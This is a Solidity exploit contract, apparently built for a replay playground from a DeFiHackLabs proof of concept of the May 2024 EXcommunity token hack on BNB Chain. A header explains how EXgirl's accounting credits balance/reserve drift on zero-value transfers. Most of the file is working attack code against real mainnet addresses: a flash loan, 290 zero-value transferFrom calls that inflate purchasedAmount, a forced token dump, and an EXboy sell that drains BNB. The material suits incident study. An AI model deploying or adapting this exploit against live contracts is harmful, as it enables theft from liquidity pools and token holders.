// SPDX-License-Identifier: UNLICENSED
pragma solidity >=0.7.0 <0.9.0;

// Synthetic standalone exploit for the EVM Playground (2024-05-EXcommunity).
//
// The DeFiHackLabs PoC runs the whole attack INLINE on the Foundry
// `ContractTest` itself (the PancakeSwap-V3 flash callback
// `pancakeV3FlashCallback` lives on the test contract, which is also the
// "attacker" whose native BNB balance is measured). This contract is a
// faithful, self-contained copy of that inline attack's CORE vulnerability
// sequence (flash-borrow BUSDT -> poison EXgirl's purchasedAmount -> trigger
// the auto-dump -> realize BNB via EXboy -> repay the flash loan). Logic and
// constants are copied verbatim from test/EXcommunity_exp.sol. No imports -
// it compiles anywhere.
//
// Root cause (EXgirl._update, "buy" branch): EXgirl accrues
// `purchasedAmount += balanceOf(pair, BUSDT) - reserve0` on every pair-side
// transfer, INCLUDING zero-value ones, with no check that the caller actually
// paid anything and no `sync()` before measuring. A plain `transfer` of BUSDT
// straight to the pair (no `sync()`) creates a permanent balance/reserve
// drift; hammering `transferFrom(pair, attacker, 0)` 290x credits that same
// drift 290 times, ballooning `purchasedAmount` from ~3,207 to ~115.7M. A
// later plain transfer triggers `_distribute()`, which market-sells
// `purchasedAmount * rebalanceRatio` worth of EXgirl via the shared
// TokenDistributor - dumping ~18.74M EXgirl and routing the proceeds (via the
// distributor) into the sister EXboy token's internal BNB reserve. EXboy
// prices itself off its own `address(this).balance`, so the attacker then
// sells cheaply-accumulated EXboy back for ~63.3 BNB, nets ~32.9 BNB after
// repaying the flash loan.
//
// Replay note on the EXboy accumulation step: the original test deploys 10
// helper contracts via CREATE2 and `vm.roll`s the block number by 1 between
// each helper's buy()/send() pair, to dodge EXboy's PER-BLOCK MEV guard
// (`lastTransaction[address(this)] == block.number` inside EXboy's own
// `_transfer`, keyed on EXboy itself as `from` for every `buy()` - NOT
// per-helper - so two buys in the same block always revert regardless of
// which distinct helper address calls). The recorder replays the whole
// exploit at ONE fixed block, so this multi-block cheatcode sequence cannot
// be reproduced inside a single recorded call. It is orthogonal to the
// EXgirl accounting bug this PoC demonstrates (it is merely how the attacker
// cheaply acquired the EXboy used in the final sell), so the config's
// `setup` pre-seeds the exploit contract with the same ~25,380.99 EXboy via
// `dealToken` (mints out of thin air, does not touch EXboy's own internal
// `_balances[boy]` reserve, so getReserves()/getPrice() are unaffected) and
// the recorded run() begins at the flash-borrow, covering the actual bug.

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
    function transferFrom(address, address, uint256) external returns (bool);
}

interface IWBNB {
    function deposit() external payable;
}

interface IUniPairV3 {
    function flash(address recipient, uint256 amount0, uint256 amount1, bytes calldata data) external;
}

interface IUniPairV2 {
    function skim(address to) external;
}

interface IUniRouterV2 {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

interface IBoy is IERC20 {
    function getPrice() external returns (uint256);
}

contract EXcommunityDrain {
    IWBNB constant WBNB = IWBNB(payable(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c));
    IUniPairV3 constant Pool = IUniPairV3(0x36696169C63e42cd08ce11f5deeBbCeBae652050);
    IUniPairV2 constant Pair = IUniPairV2(0x74f5FE81F67FA30A679d3547f7F9B97a2dd46BA5);
    IUniRouterV2 constant Router = IUniRouterV2(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    IERC20 constant BUSDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IERC20 constant Girl = IERC20(0xb1de93DAe1CDdF429eEc9DB30b78759d17495758);
    IBoy constant boy = IBoy(0xdf4895Cd8247284Ae3a7b3E28cf6c03113fADa5f);

    // Single recorded entrypoint: mirrors testExploit() -> flash borrow.
    // Assumes `setup` already seeded this contract with ~25,380.99 EXboy
    // (mirrors the test's 10x-helper buy()/send() accumulation, done
    // out-of-band - see file header).
    function run() external {
        Pool.flash(address(this), 400_000_000_000_000_000_000_000, 0, "0x123");
    }

    function pancakeV3FlashCallback(uint256 fee0, uint256, bytes calldata) external {
        // Seed a tiny EXgirl balance so the later plain `transfer` (step 7,
        // which triggers _distribute()) has tokens to move.
        swap_token_to_token(address(BUSDT), address(Girl), 1 ether);

        // Donate 399,000 BUSDT straight to the pair (no sync) -> forges the
        // balanceOf(pair) - reserve0 drift that EXgirl's "buy" branch trusts.
        BUSDT.transfer(address(Pair), 399_000 ether);

        // 290x zero-value transferFrom(pair, this, 0): each call re-reads the
        // same stale drift and adds it again to purchasedAmount.
        for (uint256 j = 0; j < 290; j++) {
            Girl.transferFrom(address(Pair), address(this), 0);
        }

        // Recover the donation now that purchasedAmount is poisoned.
        Pair.skim(address(this));

        // Plain transfer triggers EXgirl._distribute(), which dumps
        // purchasedAmount * rebalanceRatio worth of EXgirl via the shared
        // TokenDistributor, routing BNB into EXboy's internal reserve.
        Girl.transfer(address(this), 1_000_000);

        boy.getPrice();

        // Sell the pre-seeded EXboy back into its now-inflated internal BNB
        // reserve (transfer-to-self triggers EXboy's sell() path).
        boy.transfer(address(boy), 25_380_992_089_360_281_325_724);

        // Repay the flash loan: wrap 0.4 BNB, swap to BUSDT, transfer back.
        WBNB.deposit{value: 0.4 ether}();
        swap_token_to_token(address(WBNB), address(BUSDT), 0.4 ether);
        BUSDT.transfer(msg.sender, 400_000 ether + fee0);
    }

    function swap_token_to_token(address a, address b, uint256 amount) internal {
        IERC20(a).approve(address(Router), amount);
        address[] memory path = new address[](2);
        path[0] = a;
        path[1] = b;
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(amount, 0, path, address(this), block.timestamp);
    }

    receive() external payable {}
    fallback() external payable {}
}
